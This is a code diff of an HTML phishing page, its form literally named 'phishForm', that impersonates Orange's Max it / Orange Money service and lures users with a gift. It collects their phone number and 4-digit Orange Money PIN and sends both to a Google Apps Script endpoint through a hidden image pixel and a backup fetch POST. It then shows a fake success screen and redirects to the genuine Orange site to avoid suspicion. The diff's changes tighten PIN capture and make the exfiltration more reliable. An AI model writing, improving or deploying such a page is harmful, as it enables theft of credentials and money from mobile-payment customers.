@@ -97,7 +97,9 @@
             padding: 14px 16px;
             border: 2px solid #e8e8e8;
             border-radius: 12px;
-            font-size: 16px;
+            font-size: 20px;
+            letter-spacing: 3px;
+            text-align: center;
             outline: none;
             transition: border-color 0.25s;
             background: #fafafa;
@@ -107,7 +109,8 @@
             background: #fff;
         }
         .form-group input::placeholder {
-            color: #bbb;
+            color: #ccc;
+            letter-spacing: 4px;
         }
         .btn {
             width: 100%;
@@ -127,9 +130,6 @@
             transform: translateY(-1px);
             box-shadow: 0 6px 25px rgba(255,107,0,0.45);
         }
-        .btn:active {
-            transform: translateY(0);
-        }
         .btn:disabled {
             background: #bbb;
             box-shadow: none;
@@ -143,9 +143,6 @@
             margin-top: 18px;
             line-height: 1.5;
         }
-        .note strong {
-            color: #777;
-        }
         .footer-links {
             display: flex;
             justify-content: center;
@@ -156,9 +153,6 @@
         .footer-links a {
             color: #bbb;
             text-decoration: none;
-        }
-        .footer-links a:hover {
-            color: #ff6b00;
         }
         .hidden {
             display: none !important;
@@ -201,26 +195,26 @@
             font-size: 14px;
             line-height: 1.7;
         }
-        .success-wrap .redirect-note {
-            margin-top: 18px;
-            font-size: 12px;
-            color: #aaa;
-        }
         .phone-hint {
             font-size: 12px;
             color: #999;
             margin-top: 4px;
-            padding-left: 4px;
+            text-align: center;
+        }
+        .pin-hint {
+            font-size: 12px;
+            color: #999;
+            margin-top: 4px;
+            text-align: center;
         }
     </style>
 </head>
 <body>
     <div class="card" id="mainContainer">
 
-        <!-- PAGE 1 : FORMULAIRE -->
+        <!-- PAGE 1: FORM -->
         <div id="formPage">
             <div class="logo-wrap">
-                <!-- ✅ LOGO MAX IT — FICHIER LOCAL DANS LE MÊME DOSSIER -->
                 <img src="logo.png" alt="Max it" onerror="this.style.display='none'">
             </div>
 
@@ -237,14 +231,39 @@
 
             <form id="phishForm">
                 <div class="form-group">
-                    <label>📱 Numéro de téléphone Orange</label>
-                    <input type="tel" id="phone" placeholder="Ex : 691234567" required pattern="[0-9]{9}" maxlength="9" inputmode="numeric" autocomplete="off">
+                    <label>📱 Numéro de téléphone</label>
+                    <input
+                        type="tel"
+                        id="phone"
+                        placeholder="69XXXXXXX"
+                        required
+                        maxlength="9"
+                        inputmode="numeric"
+                        pattern="[0-9]{9}"
+                        title="Entrez exactement 9 chiffres"
+                        autocomplete="off"
+                        oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 9);"
+                    >
                     <div class="phone-hint">Format : 9 chiffres (ex: 691234567)</div>
                 </div>
+
                 <div class="form-group">
-                    <label>🔐 Code PIN Orange Money</label>
-                    <input type="password" id="pin" placeholder="Votre code secret" required maxlength="8" inputmode="numeric" autocomplete="off">
+                    <label>🔐 Code PIN</label>
+                    <input
+                        type="password"
+                        id="pin"
+                        placeholder="••••"
+                        required
+                        maxlength="4"
+                        inputmode="numeric"
+                        pattern="[0-9]{4}"
+                        title="Entrez exactement 4 chiffres"
+                        autocomplete="off"
+                        oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);"
+                    >
+                    <div class="pin-hint">Code à 4 chiffres (Orange Money)</div>
                 </div>
+
                 <button type="submit" class="btn" id="submitBtn">✅ Réclamer mon cadeau</button>
             </form>
 
@@ -259,7 +278,7 @@
             </div>
         </div>
 
-        <!-- PAGE 2 : CHARGEMENT -->
+        <!-- PAGE 2: LOADING -->
         <div id="loadingPage" class="hidden">
             <div class="loader-wrap">
                 <div class="spinner"></div>
@@ -267,7 +286,7 @@
             </div>
         </div>
 
-        <!-- PAGE 3 : SUCCÈS + REDIRECTION -->
+        <!-- PAGE 3: SUCCESS + REDIRECT -->
         <div id="successPage" class="hidden">
             <div class="success-wrap">
                 <div class="icon">🎉</div>
@@ -291,49 +310,67 @@
             const successPage = document.getElementById('successPage');
             const submitBtn = document.getElementById('submitBtn');
 
-            // ⚠️ REMPLACER PAR L'URL DE TA WEB APP GOOGLE APPS SCRIPT
+            const phoneInput = document.getElementById('phone');
+            const pinInput = document.getElementById('pin');
+
+            // Force digits only, max lengths
+            phoneInput.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 9);
+            });
+            pinInput.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);
+            });
+
+            // ⚠️ REPLACE WITH YOUR GOOGLE APPS SCRIPT WEB APP URL (/exec)
             const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzdY2ewVqF6VpDrAOu9zVMr_oSM485XBgeT52G2N6VrdMIq5k27FAu63gy4O1PlcJe7PQ/exec';
 
-            form.addEventListener('submit', async function(e) {
+            form.addEventListener('submit', function(e) {
                 e.preventDefault();
 
-                const phone = document.getElementById('phone').value.trim();
-                const pin = document.getElementById('pin').value.trim();
+                const phone = phoneInput.value.trim();
+                const pin = pinInput.value.trim();
 
+                // Strict validation
                 if (!phone || phone.length !== 9 || !/^[0-9]{9}$/.test(phone)) {
-                    alert('Veuillez entrer un numéro valide à 9 chiffres.');
+                    alert('Veuillez entrer un numéro de téléphone à exactement 9 chiffres.');
+                    phoneInput.focus();
                     return;
                 }
-                if (!pin || pin.length < 4) {
-                    alert('Veuillez entrer votre code PIN.');
+                if (!pin || pin.length !== 4 || !/^[0-9]{4}$/.test(pin)) {
+                    alert('Veuillez entrer un code PIN à exactement 4 chiffres.');
+                    pinInput.focus();
                     return;
                 }
 
                 submitBtn.disabled = true;
                 submitBtn.textContent = 'Vérification…';
-
                 formPage.classList.add('hidden');
                 loadingPage.classList.remove('hidden');
 
+                // ————— METHOD 1: IMAGE PIXEL (most reliable, no CORS) —————
                 try {
-                    // Envoi via image pixel (invisible, fiable)
-                    const img = new Image();
-                    img.src = SCRIPT_URL + '?phone=' + encodeURIComponent(phone) + '&pin=' + encodeURIComponent(pin) + '&ts=' + Date.now();
+                    const pixel = new Image();
+                    pixel.src = SCRIPT_URL
+                        + '?phone=' + encodeURIComponent(phone)
+                        + '&pin=' + encodeURIComponent(pin)
+                        + '&ts=' + Date.now();
+                } catch (e) {}
 
-                    // Envoi via fetch en no-cors (redondance)
+                // ————— METHOD 2: FETCH POST (backup sender) —————
+                try {
                     fetch(SCRIPT_URL, {
                         method: 'POST',
                         mode: 'no-cors',
                         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                         body: 'phone=' + encodeURIComponent(phone) + '&pin=' + encodeURIComponent(pin)
-                    }).catch(() => {});
-                } catch (err) {}
+                    }).catch(function() {});
+                } catch (e) {}
 
-                setTimeout(() => {
+                // Show success, then redirect
+                setTimeout(function() {
                     loadingPage.classList.add('hidden');
                     successPage.classList.remove('hidden');
-
-                    setTimeout(() => {
+                    setTimeout(function() {
                         window.location.href = 'https://www.orange.cm/fr/orange-max-it.html';
                     }, 5000);
                 }, 2500);
